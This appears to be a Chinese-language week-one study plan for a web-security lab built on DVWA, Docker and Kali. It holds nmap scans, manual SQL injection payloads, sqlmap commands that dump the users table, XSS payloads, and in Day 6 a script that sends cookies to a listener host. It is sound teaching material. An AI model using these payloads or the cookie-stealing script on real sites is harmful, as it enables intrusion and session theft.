# 第一周学习计划总览

> 🎯 目标：搭建环境，完成第一个漏洞实践

## 📅 本周时间安排

| 日期 | 主题 | 时长 | 核心内容 |
|------|------|------|---------|
| Day 1 | 环境搭建 | 2h | Docker环境、DVWA部署 |
| Day 2 | 工具熟悉 | 2h | Kali工具、网络扫描 |
| Day 3 | SQL注入基础 | 3h | DVWA SQL注入（低难度） |
| Day 4 | SQLMap实践 | 2h | 自动化SQL注入工具 |
| Day 5 | XSS反射型 | 2h | 反射型XSS攻击 |
| Day 6 | XSS存储型 | 2h | 存储型XSS攻击 |
| Day 7 | 总结复习 | 2h | 巩固知识点、实践练习 |

**总时长**: 约 15 小时

---

## 📚 每日详细安排

### Day 1: 环境搭建 ✅

**学习资料**: 
- [完整指南](./day1-complete-guide.md)
- [Docker基础](../../labs/docker-lab/README.md)

**核心任务**:
1. 安装并配置 Docker Desktop
2. 启动 Docker 实验环境
3. 验证所有服务正常运行
4. 访问 DVWA 靶机
5. 创建学习笔记

**完成标准**:
- [ ] 所有容器运行正常
- [ ] 能访问 DVWA
- [ ] 数据库创建成功

---

### Day 2: 工具熟悉

**学习资料**:
- [工具使用指南](../../labs/docker-lab/README.md#使用指南)
- [Kali工具文档](https://www.kali.org/tools/)

**核心任务**:
1. 探索 DVWA 所有漏洞模块
2. 进入 Kali Linux 容器
3. 安装常用工具（nmap, sqlmap, dirb, nikto）
4. 扫描靶机网络
5. 理解容器间网络通信

**实践内容**:
```bash
# 进入 Kali 容器
docker exec -it kali-tools bash

# 安装工具
apt update && apt install -y nmap sqlmap dirb nikto

# 扫描 DVWA
nmap -sV 172.20.0.10

# 扫描所有靶机
nmap -sV 172.20.0.10-14
```

**完成标准**:
- [ ] 能进入 Kali 容器
- [ ] 工具安装成功
- [ ] 能扫描到靶机开放端口

---

### Day 3: SQL 注入基础

**学习资料**:
- [SQL注入完整教程](./day3-sql-injection-guide.md)
- [DVWA SQL Injection](https://github.com/digininja/DVWA)

**核心任务**:
1. 理解 SQL 注入原理
2. 手动测试 SQL 注入点
3. 使用 UNION 注入获取数据
4. 理解不同类型 SQL 注入

**实践步骤**:
```sql
-- 1. 判断注入点
1' or '1'='1

-- 2. 确定列数
1' order by 1--+
1' order by 2--+
1' order by 3--+

-- 3. 获取数据
1' union select 1,2--+
1' union select user(),database()--+
1' union select table_name,2 from information_schema.tables where table_schema='dvwa'--+
```

**完成标准**:
- [ ] 能判断注入点
- [ ] 能获取数据库信息
- [ ] 能获取用户数据

---

### Day 4: SQLMap 自动化

**学习资料**:
- [SQLMap使用指南](./day4-sqlmap-guide.md)
- [SQLMap官方文档](https://github.com/sqlmapproject/sqlmap)

**核心任务**:
1. 理解 SQLMap 原理
2. 获取 DVWA Cookie
3. 使用 SQLMap 自动注入
4. 对比手工与自动化

**实践步骤**:
```bash
# 基础探测
sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=xxx; security=low" \
       --batch

# 获取数据库
sqlmap -u "..." --cookie="..." --dbs

# 获取表
sqlmap -u "..." --cookie="..." -D dvwa --tables

# 获取数据
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
```

**完成标准**:
- [ ] SQLMap 能检测到注入点
- [ ] 能自动获取数据
- [ ] 理解手工与自动的区别

---

### Day 5: XSS 反射型

**学习资料**:
- [XSS攻击指南](./day5-xss-reflected.md)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)

**核心任务**:
1. 理解 XSS 原理
2. 测试反射型 XSS
3. 构造不同 Payload
4. 理解 XSS 危害

**实践步骤**:
```html
<!-- 基础测试 -->
<script>alert('XSS')</script>

<!-- 获取 Cookie -->
<script>alert(document.cookie)</script>

<!-- 图片标签 -->
<img src=x onerror=alert('XSS')>

<!-- 事件处理 -->
<svg onload=alert('XSS')>
```

**完成标准**:
- [ ] 能触发 XSS 弹窗
- [ ] 能获取 Cookie
- [ ] 理解反射型 XSS 特点

---

### Day 6: XSS 存储型

**学习资料**:
- [存储型XSS指南](./day6-xss-stored.md)

**核心任务**:
1. 理解存储型 XSS 原理
2. 测试 DVWA 存储型 XSS
3. 设置监听服务器
4. 对比两种 XSS 类型

**实践步骤**:
```html
<!-- 存储型 XSS -->
<script>alert('Stored XSS')</script>

<!-- 窃取 Cookie -->
<script>
new Image().src = "http://172.20.0.100:8888/?cookie=" + document.cookie;
</script>
```

**完成标准**:
- [ ] 能注入存储型 XSS
- [ ] 理解与反射型的区别
- [ ] 能设置监听接收数据

---

### Day 7: 总结复习

**学习资料**:
- [本周总结](./day7-summary.md)

**核心任务**:
1. 复习所有知识点
2. 整理学习笔记
3. 完成实践练习
4. 准备下周内容

**复习清单**:
- [ ] SQL 注入手工测试流程
- [ ] SQLMap 常用命令
- [ ] XSS 两种类型区别
- [ ] 常用 Payload 记录

---

## 📊 学习评估

### 本周技能点

| 技能 | 级别 | 自评 | 备注 |
|------|------|------|------|
| Docker 使用 | ⭐⭐ | /5 | |
| SQL 注入手工 | ⭐⭐⭐ | /5 | |
| SQLMap 使用 | ⭐⭐ | /5 | |
| XSS 反射型 | ⭐⭐ | /5 | |
| XSS 存储型 | ⭐⭐ | /5 | |
| Kali 工具 | ⭐ | /5 | |

### 本周目标

**必须掌握**:
- [x] Docker 环境搭建
- [ ] SQL 注入基本原理
- [ ] SQLMap 基本使用
- [ ] XSS 两种类型

**建议掌握**:
- [ ] SQL 注入手工测试
- [ ] 多种 XSS Payload
- [ ] Kali 常用工具

**拓展学习**:
- [ ] 其他 SQL 注入类型
- [ ] XSS 防御方法
- [ ] 抓包工具使用

---

## 📝 学习笔记模板

每天学习后，建议记录以下内容：

```markdown
# Day X 学习笔记

## 今日目标
- [ ] 目标1
- [ ] 目标2

## 学习内容

### 知识点1
要点：
实践：

### 知识点2
要点：
实践：

## 实践记录

### 成功案例
描述：
Payload：
截图：

### 失败案例
描述：
原因：
解决：

## 遇到的问题
1. 
2. 

## 解决方案
1. 
2. 

## 心得体会


## 明日计划
- [ ] 
- [ ] 
```

---

## 🎯 本周学习建议

### 学习方法

1. **理论先行**
   - 先阅读理论部分
   - 理解原理和概念
   - 再动手实践

2. **边学边练**
   - 每个知识点立即实践
   - 不要只看不练
   - 多尝试不同方法

3. **记录笔记**
   - 记录成功的 Payload
   - 记录失败的原因
   - 记录心得体会

4. **复习巩固**
   - 每天结束前复习
   - 每周总结归纳
   - 定期回顾笔记

### 时间分配

```
理论学习: 30%
动手实践: 50%
总结复习: 20%
```

### 学习资源

**官方文档**:
- DVWA: https://github.com/digininja/DVWA
- SQLMap: https://github.com/sqlmapproject/sqlmap
- OWASP: https://owasp.org/

**推荐书籍**:
- 《Web安全深度剖析》
- 《白帽子讲Web安全》
- 《SQL注入攻击与防御》

**在线平台**:
- TryHackMe: https://tryhackme.com
- PortSwigger: https://portswigger.net/web-security

---

## ⚠️ 注意事项

1. **安全第一**
   - 仅在自己的实验环境中测试
   - 不要扫描公网 IP
   - 遵守法律法规

2. **耐心学习**
   - 不要急于求成
   - 理解原理比记住步骤重要
   - 遇到问题多思考多查资料

3. **做好笔记**
   - 好记性不如烂笔头
   - 定期复习总结
   - 建立自己的知识库

---

## 🎉 本周完成后

你将掌握：
- ✅ Docker 容器化环境搭建
- ✅ SQL 注入基本原理和实践
- ✅ XSS 攻击基本原理和实践
- ✅ 常用安全工具使用

**下一步**:
- Week 2: SQLi Labs 系统学习
- Week 3: 文件上传、命令注入
- Week 4: 综合靶机练习

---

**准备好了吗？让我们开始第一天的学习！** 🚀
